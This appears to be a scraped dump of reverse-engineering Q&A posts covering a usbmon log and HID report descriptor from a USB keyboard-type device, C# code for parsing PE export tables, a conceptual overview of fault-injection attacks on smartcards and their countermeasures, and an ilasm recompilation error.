ffff88008954e900 3348937674 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348938664 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348938676 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348939664 C Ii:1:003:1 0:1 8 = 00002200 00000000
ffff88008954e900 3348939674 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348940661 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348940671 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348941660 C Ii:1:003:1 0:1 8 = 00002400 00000000
ffff88008954e900 3348941670 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348942661 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348942670 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348943673 C Ii:1:003:1 0:1 8 = 00003600 00000000
ffff88008954e900 3348943685 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348944676 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348944700 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348945675 C Ii:1:003:1 0:1 8 = 02001600 00000000
ffff88008954e900 3348945687 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348946661 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348946672 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348947661 C Ii:1:003:1 0:1 8 = 02000c00 00000000
ffff88008954e900 3348947673 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348948661 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348948672 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348949664 C Ii:1:003:1 0:1 8 = 02001100 00000000
ffff88008954e900 3348949677 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348950665 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348950676 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348951666 C Ii:1:003:1 0:1 8 = 02000a00 00000000
ffff88008954e900 3348951677 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348952666 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348952677 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348953666 C Ii:1:003:1 0:1 8 = 02000b00 00000000
ffff88008954e900 3348953678 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348954665 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348954677 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348956665 C Ii:1:003:1 0:1 8 = 00003600 00000000
ffff88008954e900 3348956680 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348957680 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348957696 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348958677 C Ii:1:003:1 0:1 8 = 02003800 00000000
ffff88008954e900 3348958692 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348959663 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348959678 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348960663 C Ii:1:003:1 0:1 8 = 00003300 00000000
ffff88008954e900 3348960674 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348961669 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348961699 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348962670 C Ii:1:003:1 0:1 8 = 00002300 00000000
ffff88008954e900 3348962697 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348963663 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348963678 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348964664 C Ii:1:003:1 0:1 8 = 00002000 00000000
ffff88008954e900 3348964676 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348965667 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348965678 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348966667 C Ii:1:003:1 0:1 8 = 00002300 00000000
ffff88008954e900 3348966678 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348967671 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348967681 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348968674 C Ii:1:003:1 0:1 8 = 00001e00 00000000
ffff88008954e900 3348968703 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348969673 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348969701 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348970670 C Ii:1:003:1 0:1 8 = 00002000 00000000
ffff88008954e900 3348970697 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348971672 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348971698 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348972676 C Ii:1:003:1 0:1 8 = 00002500 00000000
ffff88008954e900 3348972705 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348973678 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348973688 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348974668 C Ii:1:003:1 0:1 8 = 00002700 00000000
ffff88008954e900 3348974694 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348975669 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348975695 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348976667 C Ii:1:003:1 0:1 8 = 00002700 00000000
ffff88008954e900 3348976695 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348977670 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348977700 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348978669 C Ii:1:003:1 0:1 8 = 00002700 00000000
ffff88008954e900 3348978695 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348979670 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348979699 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348980669 C Ii:1:003:1 0:1 8 = 00002700 00000000
ffff88008954e900 3348980694 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348981674 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348981702 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348982678 C Ii:1:003:1 0:1 8 = 00002700 00000000
ffff88008954e900 3348982704 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348983687 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348983714 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348984682 C Ii:1:003:1 0:1 8 = 00002200 00000000
ffff88008954e900 3348984709 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348985675 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348985702 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348986679 C Ii:1:003:1 0:1 8 = 00002500 00000000
ffff88008954e900 3348986707 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348987682 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348987712 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348988685 C Ii:1:003:1 0:1 8 = 00002300 00000000
ffff88008954e900 3348988714 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348989679 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348989707 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348990678 C Ii:1:003:1 0:1 8 = 00002200 00000000
ffff88008954e900 3348990706 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348991686 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348991715 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348992686 C Ii:1:003:1 0:1 8 = 00002400 00000000
ffff88008954e900 3348992714 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348993681 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348993690 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348994667 C Ii:1:003:1 0:1 8 = 00002e00 00000000
ffff88008954e900 3348994692 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348995668 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348995684 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348996668 C Ii:1:003:1 0:1 8 = 00001e00 00000000
ffff88008954e900 3348996682 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348997670 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348997684 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348998713 C Ii:1:003:1 0:1 8 = 00001f00 00000000
ffff88008954e900 3348998750 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3348999678 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3348999709 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349000690 C Ii:1:003:1 0:1 8 = 00002000 00000000
ffff88008954e900 3349000721 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349001690 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3349001721 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349002689 C Ii:1:003:1 0:1 8 = 00002100 00000000
ffff88008954e900 3349002720 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349003692 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3349003724 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349004687 C Ii:1:003:1 0:1 8 = 00002200 00000000
ffff88008954e900 3349004717 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349005688 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3349005718 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349006687 C Ii:1:003:1 0:1 8 = 00002300 00000000
ffff88008954e900 3349006717 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349007675 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3349007701 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349008687 C Ii:1:003:1 0:1 8 = 00002400 00000000
ffff88008954e900 3349008715 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349009682 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3349009712 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349010681 C Ii:1:003:1 0:1 8 = 00002500 00000000
ffff88008954e900 3349010711 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349011681 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3349011710 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349012690 C Ii:1:003:1 0:1 8 = 00002600 00000000
ffff88008954e900 3349012719 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349013673 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3349013682 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349014697 C Ii:1:003:1 0:1 8 = 00002700 00000000
ffff88008954e900 3349014727 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349015678 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3349015706 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349016692 C Ii:1:003:1 0:1 8 = 00001e00 00000000
ffff88008954e900 3349016721 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349017699 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3349017727 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349018679 C Ii:1:003:1 0:1 8 = 00001f00 00000000
ffff88008954e900 3349018706 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349020676 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3349020703 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349021688 C Ii:1:003:1 0:1 8 = 02003800 00000000
ffff88008954e900 3349021720 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349022673 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3349022683 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349023676 C Ii:1:003:1 0:1 8 = 02002e00 00000000
ffff88008954e900 3349023706 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349024670 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3349024680 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349025670 C Ii:1:003:1 0:1 8 = 00002700 00000000
ffff88008954e900 3349025680 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349026671 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3349026679 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349027670 C Ii:1:003:1 0:1 8 = 00002700 00000000
ffff88008954e900 3349027678 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349028677 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3349028705 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349029681 C Ii:1:003:1 0:1 8 = 00002700 00000000
ffff88008954e900 3349029707 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349030680 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3349030706 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349031693 C Ii:1:003:1 0:1 8 = 00001e00 00000000
ffff88008954e900 3349031721 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349032680 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3349032707 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349033685 C Ii:1:003:1 0:1 8 = 00001f00 00000000
ffff88008954e900 3349033713 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349034681 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3349034707 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349035679 C Ii:1:003:1 0:1 8 = 00002400 00000000
ffff88008954e900 3349035706 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349036676 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3349036703 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349037690 C Ii:1:003:1 0:1 8 = 00001e00 00000000
ffff88008954e900 3349037718 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349038677 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3349038703 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349039691 C Ii:1:003:1 0:1 8 = 00002000 00000000
ffff88008954e900 3349039719 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349040677 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3349040704 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349041692 C Ii:1:003:1 0:1 8 = 00002500 00000000
ffff88008954e900 3349041720 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349042677 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3349042704 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349043690 C Ii:1:003:1 0:1 8 = 02003800 00000000
ffff88008954e900 3349043721 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349044684 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3349044698 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349045681 C Ii:1:003:1 0:1 8 = 00005800 00000000
ffff88008954e900 3349045710 S Ii:1:003:1 -115:1 8 &lt;
ffff88008954e900 3349046682 C Ii:1:003:1 0:1 8 = 00000000 00000000
ffff88008954e900 3349046709 S Ii:1:003:1 -115:1 8 &lt;
</code></pre>

<p>As you can see, the characters 'SINGH' (my last name) appear in the on-screen output, but I can't find those ASCII values anywhere in the data. How should I go about reverse engineering this device?</p>

<p><strong>EDIT:</strong>
Thanks to Igor's answer I got the Report Descriptors, but I'm not quite sure how to make use of them:</p>

<pre><code>  Report Descriptor: (length is 76)
    Item(Global): Usage Page, data= [ 0x01 ] 1
                    Generic Desktop Controls
    Item(Local ): Usage, data= [ 0x06 ] 6
                    Keyboard
    Item(Main  ): Collection, data= [ 0x01 ] 1
                    Application
    Item(Global): Usage Page, data= [ 0x07 ] 7
                    Keyboard
    Item(Local ): Usage Minimum, data= [ 0xe0 ] 224
                    Control Left
    Item(Local ): Usage Maximum, data= [ 0xe7 ] 231
                    GUI Right
    Item(Global): Logical Minimum, data= [ 0x00 ] 0
    Item(Global): Logical Maximum, data= [ 0x01 ] 1
    Item(Global): Report Size, data= [ 0x01 ] 1
    Item(Global): Report Count, data= [ 0x08 ] 8
    Item(Main  ): Input, data= [ 0x02 ] 2
                    Data Variable Absolute No_Wrap Linear
                    Preferred_State No_Null_Position Non_Volatile Bitfield
    Item(Global): Report Count, data= [ 0x01 ] 1
    Item(Global): Report Size, data= [ 0x08 ] 8
    Item(Main  ): Input, data= [ 0x03 ] 3
                    Constant Variable Absolute No_Wrap Linear
                    Preferred_State No_Null_Position Non_Volatile Bitfield
    Item(Global): Report Count, data= [ 0x05 ] 5
    Item(Global): Report Size, data= [ 0x01 ] 1
    Item(Global): Usage Page, data= [ 0x08 ] 8
                    LEDs
    Item(Local ): Usage Minimum, data= [ 0x01 ] 1
                    NumLock
    Item(Local ): Usage Maximum, data= [ 0x05 ] 5
                    Kana
    Item(Main  ): Output, data= [ 0x02 ] 2
                    Data Variable Absolute No_Wrap Linear
                    Preferred_State No_Null_Position Non_Volatile Bitfield
    Item(Global): Report Count, data= [ 0x01 ] 1
    Item(Global): Report Size, data= [ 0x03 ] 3
    Item(Main  ): Output, data= [ 0x03 ] 3
                    Constant Variable Absolute No_Wrap Linear
                    Preferred_State No_Null_Position Non_Volatile Bitfield
    Item(Global): Report Count, data= [ 0x06 ] 6
    Item(Global): Report Size, data= [ 0x08 ] 8
    Item(Global): Logical Minimum, data= [ 0x00 ] 0
    Item(Global): Logical Maximum, data= [ 0x66 ] 102
    Item(Global): Usage Page, data= [ 0x07 ] 7
                    Keyboard
    Item(Local ): Usage Minimum, data= [ 0x00 ] 0
                    No Event
    Item(Local ): Usage Maximum, data= [ 0x66 ] 102
                    Power (not a key)
    Item(Main  ): Input, data= [ 0x00 ] 0
                    Data Array Absolute No_Wrap Linear
                    Preferred_State No_Null_Position Non_Volatile Bitfield
    Item(Global): Logical Maximum, data= [ 0xff 0x00 ] 255
    Item(Global): Usage Page, data= [ 0x00 0xff ] 65280
                    (null)
    Item(Local ): Usage, data= [ 0x20 ] 32
                    (null)
    Item(Global): Report Count, data= [ 0x18 ] 24
    Item(Main  ): Feature, data= [ 0x02 0x01 ] 258
                    Data Variable Absolute No_Wrap Linear
                    Preferred_State No_Null_Position Non_Volatile Buffered Bytes
    Item(Main  ): End Collection, data=none
</code></pre>
","<p>Since it uses HID class, you should probably check the <a href=""http://www.usb.org/developers/devclass_docs/HID1_11.pdf"" rel=""nofollow"">USB HID Spec</a> from USB.org. The relevant part seems to be the section 8, ""Report Protocol"":</p>

<blockquote>
  <h1>8.1 Report Types</h1>
  
  <p>Reports contain data from one or more items. Data transfers are sent from the device to the host through the <strong>Interrupt In</strong> pipe in the form of reports. Reports may also be requested (polled)
  and sent through the Control pipe or sent through an optional
  <strong>Interrupt Out</strong> pipe. A report contains the state of all the items
  (Input, Output or Feature) belonging to a particular Report ID. The
  software application is responsible for extracting the individual
  items from the report based on the Report descriptor.</p>
</blockquote>

<p><code>Ii</code> in the usbmon log refer to ""Interrupt In"", so these are ""reports"" from the device. Looks like the changing bytes in the data packets (such as 22, 27, 1e, 1f) correspond to keyboard keys. It seems that to figure out the mapping you need to parse the ""Report Descriptor"", which can be done by <code>lsusb</code> if you <a href=""http://libusb.6.n5.nabble.com/How-to-dump-HID-report-descriptor-under-Linux-td5971.html"" rel=""nofollow"">first detach the default driver</a>.</p>
","3238"
"Are there exports with neither ordinal nor name or am I not understanding the PE documentation?","694","","<p>I don't understand one thing in the export data directory of PE files.</p>

<p>The documentation says that there is a set count of exports (let's name it <code>ExportCount</code>, first row of following table) and another count of names/ordinals (name it <code>NameCount</code>, second row in following table). I read it like that the count of export names is the same as the ordinal indices count. At least that's what <a href=""https://msdn.microsoft.com/en-us/windows/hardware/gg463119.aspx"" rel=""nofollow noreferrer"">their documentation</a> says:</p>

<p><img src=""https://i.stack.imgur.com/KcSxK.png"" alt=""Microsoft Documentation""></p>

<p>I tried parsing a Win8.1.1 x64 Shell32.dll, and I get different results compared to Dependency Walker. I have 933 as <code>ExportCount</code> and 354 as <code>NameCount</code>. So there should be 933 exports in total, with only 354 having an ordinal and/or name. Don't ask me how you would import the remaining 579 exports, as that's what I don't understand.</p>

<p>If I open Shell32 in Dependency Walker, it first lists <code>NameCount</code> exports with a name and ordinal, but then it shows the remaining amount of <code>ExportCount - NameCount</code> exports which surprisingly <em>do</em> have ordinals (starting at the blue line here):</p>

<p><img src=""https://i.stack.imgur.com/rKVrl.png"" alt=""Dependency Walker""></p>

<p>To me, this doesn't make any sense according to the documentation. I tried to read <code>ExportCount</code> ordinals instead of only <code>NameCount</code> ones in sequence, but only rubbish comes out.</p>

<p>So my questions are:</p>

<ul>
<li>Is the documentation wrong / incomplete?</li>
<li>Am I understanding something wrong in the documentation?</li>
<li>How to get the remaining ordinals like Dependency Walker does it?</li>
</ul>

<p><strong>EDIT:</strong> Thanks to Guntrams answer below, I found out where my brain was faulty. This is how it really is:</p>

<ul>
<li>The ordinal of each exported address is simply the index in the export address array (plus the ordinal base specified in the export directory table however, which <em>may</em> make it differ from simple indices. And that is often the case since ordinals usually start at 1 according to the documentation).</li>
<li>Some exports have names, and these names are mapped to the export address array with an ordinal, which in turn is the index to the export address array.</li>
<li>Since some exports have no names, the ordinal is not explicitly specified in the ordinal array, because it would make no sense to map ""no name"" to an export.</li>
</ul>

<p>My C# code does it like this, for reference - the output is the same like the one in Dependency Walker:</p>

<pre><code>private void ReadExportTables(PEFile peFile, BinaryReader reader, DataDirectoryHeader header)
{
    // Read the export address table which contains the RVAs to the exported code or forwarder names.
    ExportEntry[] exportEntries = new ExportEntry[EntryCount];
    reader.BaseStream.Seek(peFile.GetFileOffset(CodeAddressTableRva), SeekOrigin.Begin);
    for (int i = 0; i &lt; exportEntries.Length; i++)
    {
        exportEntries[i].Ordinal = (ushort)(i + OrdinalStartNumber);
        exportEntries[i].CodeOrForwarderRva = reader.ReadUInt32();
    }

    // Read the ordinal table containing indices (with base) to named entries in the export entry table.
    reader.BaseStream.Seek(peFile.GetFileOffset(OrdinalTableRva), SeekOrigin.Begin);
    uint[] ordinals = new uint[NameEntryCount];
    for (int i = 0; i &lt; ordinals.Length; i++)
    {
        // Get the name for the ordinal, which has the same index as the ordinal array element.
        ordinals[i] = reader.ReadUInt16();
    }

    // Read the export name pointer table which contains pointers to names of exports.
    reader.BaseStream.Seek(peFile.GetFileOffset(NameAddressTableRva), SeekOrigin.Begin);
    for (int i = 0; i &lt; ordinals.Length; i++)
    {
        exportEntries[ordinals[i]].Hint = i;
        exportEntries[ordinals[i]].NameRva = reader.ReadUInt32();
    }

    // Read the names of the exports or forwarders.
    for (int i = 0; i &lt; exportEntries.Length; i++)
    {
        if (exportEntries[i].NameRva &gt; 0)
        {
            reader.BaseStream.Seek(peFile.GetFileOffset(exportEntries[i].NameRva), SeekOrigin.Begin);
            exportEntries[i].Name = reader.ReadString(BinaryStringFormat.ZeroTerminated, Encoding.ASCII);
        }
        // Check if it's a forwarder export (the RVA points within the export directory to a forwarder name).
        if (exportEntries[i].CodeOrForwarderRva &gt;= header.Rva
            &amp;&amp; exportEntries[i].CodeOrForwarderRva &lt; header.Rva + header.Size)
        {
            reader.BaseStream.Seek(peFile.GetFileOffset(exportEntries[i].CodeOrForwarderRva),
                SeekOrigin.Begin);
            exportEntries[i].ForwarderName = reader.ReadString(BinaryStringFormat.ZeroTerminated,
                Encoding.ASCII);
        }
    }
}
</code></pre>

<p>In case you wondered: There can still be completely empty exports, with a code address of 0, no name and thus not forwarded. Just sort these out when displaying your exports.</p>
","<p>If i understand <a href=""http://win32assembly.programminghorizon.com/pe-tut7.html"" rel=""nofollow"">http://win32assembly.programminghorizon.com/pe-tut7.html</a> correctly, the ordinal table lists <em>only</em> the number of exports that actually have a name. So, your program might have the following exports:</p>

<pre><code>n  name            address
0  funca           12345678
1  -- no name --   9abcdef0
2  funcb           76543210
3  -- no name --   fedcba98
</code></pre>

<p>This would result in</p>

<pre><code>address table entries   = 4
number of name pointers = 2
export address table    = [ 12345678, 9abcdef0, 76543210, fedcba98 ]
name pointer table      = [ funca, funcb ]
ordinal table           = [ 0, 2 ]
</code></pre>

<p>There's a 1:1 match between name pointer entries and ordinal table entries, which is why the number of name pointers equals both array sizes. But both tables list only the functions exported by name; exports that are by ordinal only don't appear in either of them. They still appear in the export address table, however.</p>

<p>(If you want a better/more precise answer, you'll have to wait for Jason Geffner, he's an astonishing source of information for this kind of thing).</p>
","8380"
"What is fault-injection reverse engineering? What are the techniques involved?","692","","<p>Trying to extract data from the hardware is often quite difficult (especially when dealing with smartcards). Fault-injection attacks allow to guess cryptographic keys based on the propagation of errors through the encryption/decryption algorithm. I know some of the types of fault-injections possible, but not all.</p>

<ul>
<li>What are the different types of fault-injections possible?</li>
<li>Do the different types of techniques offer any special advantages?</li>
</ul>
","<h3>Fault Injection Attacks</h3>

<p>Basically, we assume here that we have a black-box that produces an output using a known algorithm but with some unknown parameters. In the case of cryptography, the black-box could be a chip on a smart-card, the know algorithm could be a cryptographic algorithm and the unknown parameters would be the key of the algorithm which lies hidden in the chip (and never go out).</p>

<p>In this particular setting, we can perform what we call a '<em>chosen clear-text attack</em>', meaning that we can choose the inputs of the black-box and look at the output. But, lets also suppose that this is not enough to guess the unknown parameters (the key). So, we need a bit more to help us.</p>

<p>Our second assumption will be that we are able to introduce errors at specific chosen phase of the known algorithm. Usually, when speaking about smart-cards, it means that we have a physical setup with a very precise timer linked to the smart-card clock and a laser targeting a physical register on the chip. Beaming up the register with the laser, usually reset the register (or may introduce some random values).</p>

<p>The point of fault-injection is thus to study the effect of the injected fault on the cipher algorithm and to deduce some information about the value of the key.</p>

<p>Depending on the cipher algorithm used in the chip, the most interesting bits to reset in order to maximize the information collected about the key may vary a lot because the propagation of the error is not the same depending on the computation performed. So, each cipher algorithm need to be studied first, in order to know the best way to proceed in order to extract the key.</p>

<h3>Types of Fault-injection Attacks</h3>

<p>The different types of fault-injection analysis depends mainly on the accuracy with which you can control the error that you introduce (from the easiest to the most difficult):</p>

<ul>
<li><strong>Fully controlled error</strong>: We suppose that we have a full control on the error. Basically, we can choose what is the content of the register and when to introduce the error in the algorithm.</li>
<li><strong>Known error</strong>: We suppose that we have a partial control on the error. Meaning that we know where it has been introduced and we know what is written in the register but we cannot choose it in advance.</li>
<li><strong>Unknown error</strong>: We know exactly where, in the algorithm, the error has been introduced but we cannot control what is written nor have a knowledge of what has been written in the register.</li>
<li><strong>Fully uncontrolled error</strong>: We have no exact knowledge of what is written nor when it has been introduced in the algorithm.</li>
</ul>

<h3>Counter-measures</h3>

<p>Countering fault-injection is, in fact, quite easy but costly. You only need to duplicate the circuits and check that the two circuits gives the same output when finished. If not, you just have to issue an error without leaking any information.</p>

<p>Of course, in the case of a '<em>fully controlled error</em>' attack, one can just duplicate the laser beam as well. But, usually, the '<em>fully controlled error</em>' attack is an ideal case that is almost never reached in practice.</p>

<p>More difficult to work around, in the case of the '<em>known error</em>' attack, you can use the output of the chip (<code>output</code> / <code>error</code>) to guess the content of any register you want. You just need to perform attacks always on the same input until you get a normal <code>output</code>, then you can store what you wrote on the register. And, thus, rebuild the value of the key.</p>

<p>Anyway, the cost of circuit redundancy on a chip is quite high, both in money and power-consumption. So, not all the chips can be equipped with this.</p>

<h3>Other Related Attacks and Conclusion</h3>

<p>These attacks have to be compared (or combined) with '<em>side-channel attack</em>'. Both attacks have a different approaches and use different assumptions on what is possible or not. Combining them allow to get way further in extracting information about the device that you study.</p>

<p>Talking now about <strong>software reverse engineering</strong>, I do not know any practical use of fault injection attack nowadays. But, I'm pretty confident that you can use this technique to guess the parameters of a know algorithm that has been obfuscated without having to dissect it in details. Somehow, any debugger can rewrite a register at precise time in the program (breakpoints) with a full control of what is written in the register (we are here in the case of the '<em>fully controlled error</em>' attack). So, this can certainly be used in the case of usual obfuscated programs.</p>
","2046"
"Cannot compile native/unmanaged method","691","","<p>I disassembled a C# program with ildasm and modified the il code to my needs but now when i try to assemble it back into an exe i get these errors:</p>

<pre><code>Cannot compile native/unmanaged method
Local (embedded native) PInvoke method, the resulting PE file is unusable
</code></pre>

<p>I have generated a snk file and tried to use that with ilasm but i still get the same errors.</p>

